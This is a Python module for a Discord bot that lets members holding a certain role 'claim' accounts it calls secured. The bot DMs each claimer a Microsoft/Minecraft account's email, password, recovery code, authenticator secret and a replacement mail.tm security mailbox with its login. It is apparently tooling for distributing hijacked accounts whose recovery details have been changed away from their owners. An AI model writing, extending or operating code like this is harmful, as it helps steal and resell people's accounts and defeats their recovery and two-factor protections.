from __future__ import annotations

import json
import logging
from typing import TYPE_CHECKING

import discord

from shared import interactions
from ui import theme

if TYPE_CHECKING:
    from discord import Interaction

log = logging.getLogger("bot")

GREEN = 0x52A435
GRAY = 0x4B5563
GIFT = "\U0001f381"


def _clean(value: object) -> str:
    text = str(value or "").strip()
    if not text or text in {"Couldn't Change!", "Unknown", "?"}:
        return "N/A"
    return text


def _clean_password(value: object) -> str:
    """A password exactly as it is stored.

    A mailbox password may contain any character, so nothing is trimmed or
    escaped here - only the ``('pw',)`` row tuple SQLite hands back is
    unwrapped, which is what used to show up as ``('iRXurXiBTpUyCX',)`` in
    the temporary-password field.
    """
    if isinstance(value, (tuple, list)):
        value = value[0] if value else ""
    if value is None:
        return ""
    return str(value)


def _code(value: object) -> str:
    """One-line code block, the style every other credential field uses.

    The fence grows when the value itself contains backticks so the password
    is never truncated or reformatted.
    """
    text = str(value if value is not None else "")
    fence = "```"
    while fence in text:
        fence += "`"
    return f"{fence}{text}{fence}"


def build_claim_embed(account: dict, temp_password: str = "") -> discord.Embed:
    """Private DM payload for someone who pressed Claim."""
    ms = account.get("microsoft") or {}
    email = _clean(ms.get("email"))
    password = _clean(ms.get("password"))
    temp_email = _clean(ms.get("security_email"))
    temp_password = _clean_password(temp_password) or "N/A"

    embed = discord.Embed(
        title="An account has been secured",
        color=GREEN,
    )
    embed.add_field(name="Email", value=_code(email), inline=False)
    embed.add_field(name="Password", value=_code(password), inline=True)
    embed.add_field(name="Temp Email", value=_code(temp_email), inline=True)
    embed.add_field(name="Temp Password", value=_code(temp_password), inline=True)
    embed.add_field(
        name="Recovery Code",
        value=_code(_clean(ms.get("recovery_code"))),
        inline=False,
    )
    auth = _clean(ms.get("auth_secret"))
    if auth != "N/A":
        embed.add_field(name="Authenticator Secret", value=_code(auth), inline=False)

    if temp_email != "N/A":
        embed.add_field(
            name="Temp Email login (mail.tm)",
            value=(
                f"Address: `{temp_email}`\n"
                f"Password: `{temp_password}`\n\n"
                "1. Open [mail.tm](https://mail.tm)\n"
                "2. Sign in with the address and password above\n"
                "3. Open the Microsoft email to read the verification code"
            ),
            inline=False,
        )

    embed.set_footer(text=f"Account ID: {account.get('account_id') or 'unknown'}")
    return embed


def claimed_card(
    *,
    username: str = "",
    claimed_by: str | None = None,
    claimed_by_id: int | None = None,
) -> discord.ui.DesignerView:
    """Public card after a claim: same heading, disabled Claimed button.

    The claimer is rendered as a real mention (`<@id>`) when the id is known, so
    the card shows "Claimed by @noah" instead of plain text.
    """
    who = f"<@{claimed_by_id}>" if claimed_by_id else f"**{claimed_by or 'someone'}**"
    lines = ["## An account has been secured", ""]
    lines.append(f"Claimed by {who}")
    return theme.card(
        theme.GREEN,
        "\n".join(lines),
        thumbnail=theme.avatar_url(username) if username else None,
        buttons=[
            theme.button(
                "Claimed",
                discord.ButtonStyle.secondary,
                emoji=GIFT,
                disabled=True,
            )
        ],
    )


class ClaimUsernameModal(discord.ui.Modal):
    """Ask the claimant for the secured account's Minecraft username."""

    def __init__(self, parent: "ClaimButton") -> None:
        super().__init__(title="Confirm the Minecraft username")
        self.parent_view = parent
        self.add_item(
            discord.ui.InputText(
                label="Minecraft username",
                placeholder="Username of the secured account",
                required=True,
                max_length=16,
            )
        )

    async def callback(self, interaction: Interaction) -> None:
        await self.parent_view.submit_username(
            interaction, str(self.children[0].value or "").strip()
        )


def _load_claims_config() -> dict:
    try:
        with open("config/config.json", encoding="utf-8") as f:
            cfg = json.load(f)
    except Exception:
        return {}
    claims = cfg.get("claims") or {}
    if not isinstance(claims, dict):
        return {}
    return claims


class ClaimPersistentView(discord.ui.View):
    """Empty backbone so the persistent :class:`ClaimButton` can be attached to messages."""

    def __init__(self):
        super().__init__(timeout=None)


class ClaimButton(discord.ui.View):
    def __init__(
        self,
        *,
        account_id: str,
        username: str,
        user_id: int | None = None,
        username_at_action: str | None = None,
        already_claimed_by_user_id: int | None = None,
        already_claimed_by_username: str | None = None,
    ):
        super().__init__(timeout=None)
        self.account_id = account_id
        self.username = username
        self.user_id = user_id
        self.username_at_action = username_at_action
        self.already_claimed_by_user_id = already_claimed_by_user_id
        self.already_claimed_by_username = already_claimed_by_username
        # Keep the visual style in config.json -> claims.claim_button_label.
        try:
            self.claim.label = self._claim_button_label()
        except Exception:
            pass

    def _cfg(self) -> dict:
        return _load_claims_config()

    def _claim_enabled(self) -> bool:
        cfg = self._cfg()
        if not cfg.get("enabled", True):
            return False
        role_id = cfg.get("claim_role_id") or ""
        if not role_id or not str(role_id).strip():
            return False
        return True

    def _claim_role_id(self) -> int | None:
        role_id = _load_claims_config().get("claim_role_id") or ""
        try:
            return int(str(role_id).strip())
        except (TypeError, ValueError):
            return None

    def _claim_button_label(self) -> str:
        return str(_load_claims_config().get("claim_button_label") or "Claim")

    def _require_mc_username(self) -> bool:
        """claims.require_minecraft_username - ask for the IGN before claiming."""
        return bool(_load_claims_config().get("require_minecraft_username", False))

    def _stored_mc_name(self) -> str:
        """The secured account's Minecraft name ("" when unknown / open)."""
        if not self.account_id:
            return ""
        try:
            from database.database import DBConnection

            account = DBConnection().get_secured_account(self.account_id) or {}
        except Exception:
            log.warning("claim: could not read stored account", exc_info=True)
            return ""
        name = str((account.get("minecraft") or {}).get("name") or "").strip()
        if name.lower() in {"", "no minecraft", "unknown", "?", "n/a"}:
            return ""
        return name

    async def submit_username(self, interaction: Interaction, entered: str) -> None:
        """Modal submit: the IGN must match the account (or the account is open)."""
        entered = str(entered or "").strip()
        if not entered:
            await interactions.respond(
                interaction,
                content="Enter the account's Minecraft username to claim it.",
                ephemeral=True,
            )
            return

        expected = self._stored_mc_name()
        if expected and entered.lower() != expected.lower():
            await interactions.respond(
                interaction,
                content="That Minecraft username does not match this account.",
                ephemeral=True,
            )
            return

        await self._claim_and_deliver(interaction, from_modal=True)

    async def interaction_check(self, interaction: Interaction) -> bool:
        claims_enabled = self._claim_enabled()
        if not claims_enabled:
            await interactions.respond(
                interaction,
                content="Unclaimed-account claims are disabled right now.",
                ephemeral=True,
            )
            return False

        role_id = self._claim_role_id()
        if role_id is None:
            await interactions.respond(
                interaction,
                content="Claim role is not configured.",
                ephemeral=True,
            )
            return False

        guild = interaction.guild
        if guild is None:
            await interactions.respond(
                interaction,
                content="Claims can only be made in a server.",
                ephemeral=True,
            )
            return False

        role = guild.get_role(role_id)
        if role is None:
            await interactions.respond(
                interaction,
                content="The configured claim role does not exist in this server.",
                ephemeral=True,
            )
            return False

        if role not in interaction.user.roles:
            await interactions.respond(
                interaction,
                content="You do not have the claim role to claim this account.",
                ephemeral=True,
            )
            return False

        return True

    async def on_claim(
        self, interaction: Interaction, *, from_modal: bool = False
    ) -> None:
        await self._claim_and_deliver(interaction, from_modal=from_modal)

    async def _claim_and_deliver(
        self, interaction: Interaction, *, from_modal: bool = False
    ) -> None:
        from database.database import DBConnection

        claimed_by_user_id = int(interaction.user.id)
        claimed_by_username = str(
            interaction.user.display_name or interaction.user.name or "unknown"
        ).strip() or "unknown"

        db = DBConnection()
        ok = db.claim_account(
            self.account_id,
            claimed_by_user_id=claimed_by_user_id,
            claimed_by_username=claimed_by_username,
            claim_notes=None,
        )
        if not ok:
            already = db.get_claim(self.account_id)
            already_name = None
            if already:
                already_name = already.get("claimed_by_username")
            await interactions.respond(
                interaction,
                content=f"This account was already claimed by {already_name or 'someone'}.",
                ephemeral=True,
            )
            return

        # Flip the public card: Claimed button, disabled, plus an @mention of
        # whoever claimed it.
        card = claimed_card(
            username=self.username,
            claimed_by=claimed_by_username,
            claimed_by_id=claimed_by_user_id,
        )
        mentions = discord.AllowedMentions(users=True, roles=False, everyone=False)
        updated = False

        if from_modal:
            # A modal submit must be acknowledged itself; the card lives on the
            # message the button was pressed on.
            try:
                await interactions.respond(
                    interaction,
                    content="Claimed - check your DMs for the account details.",
                    ephemeral=True,
                )
            except Exception:
                log.warning("claim: modal acknowledgement failed", exc_info=True)
            try:
                if interaction.message is not None:
                    await interaction.message.edit(view=card, allowed_mentions=mentions)
                    updated = True
            except Exception:
                log.warning("claim: could not update the public card", exc_info=True)
        else:
            try:
                await interactions.edit(
                    interaction, view=card, allowed_mentions=mentions
                )
                updated = True
            except Exception:
                log.warning("claim: could not update the public card", exc_info=True)
                if not interaction.response.is_done():
                    await interactions.defer(interaction, ephemeral=True)

        if not updated:
            log.warning("claim: public card was not updated for %s", self.account_id)

        # Deliver the account details privately. They are never posted in the
        # channel, so the claim is the only way to receive them.
        account = None
        try:
            account = db.get_secured_account(self.account_id) if self.account_id else None
        except Exception:
            log.exception("claim: could not load secured account %s", self.account_id)

        if not account:
            await interactions.followup(
                interaction,
                content="Claimed, but the stored account details could not be found.",
                ephemeral=True,
            )
            return

        temp_email = str((account.get("microsoft") or {}).get("security_email") or "")
        temp_password = ""
        if temp_email:
            try:
                temp_password = db.get_email_password(temp_email) or ""
            except Exception:
                log.warning("claim: mailbox password lookup failed", exc_info=True)

        try:
            await interaction.user.send(embed=build_claim_embed(account, temp_password))
        except discord.Forbidden:
            await interactions.followup(
                interaction,
                content=(
                    "Claimed, but I could not DM you the details. Enable direct "
                    "messages from server members and ask an admin to unclaim it, "
                    "then press Claim again."
                ),
                ephemeral=True,
            )
        except Exception:
            log.exception("claim DM failed for %s", interaction.user.id)

    @discord.ui.button(
        label="Claim",
        style=discord.ButtonStyle.green,
        custom_id="persistent:claim_button",
        emoji=GIFT,
    )
    async def claim(self, button: discord.ui.Button, interaction: Interaction) -> None:
        claims_enabled = self._claim_enabled()
        role_id = self._claim_role_id()

        if not claims_enabled or role_id is None:
            await interactions.respond(
                interaction,
                content="Claims are not configured.",
                ephemeral=True,
            )
            return

        guild = interaction.guild
        if guild is not None:
            role = guild.get_role(role_id)
            if role is None or role not in interaction.user.roles:
                await interactions.respond(
                    interaction,
                    content="You do not have permission to claim this account.",
                    ephemeral=True,
                )
                return

        if self.already_claimed_by_user_id is not None:
            await interactions.respond(
                interaction,
                content=(
                    f"This account is already claimed by "
                    f"{self.already_claimed_by_username or 'someone'}."
                ),
                ephemeral=True,
            )
            return

        # Optional gate: make the claimant type the account's Minecraft username
        # before the claim goes through (claims.require_minecraft_username).
        if self._require_mc_username():
            await interactions.send_modal(interaction, ClaimUsernameModal(self))
            return

        # Persistent button: claim role is already verified by interaction_check.
        await self.on_claim(interaction)
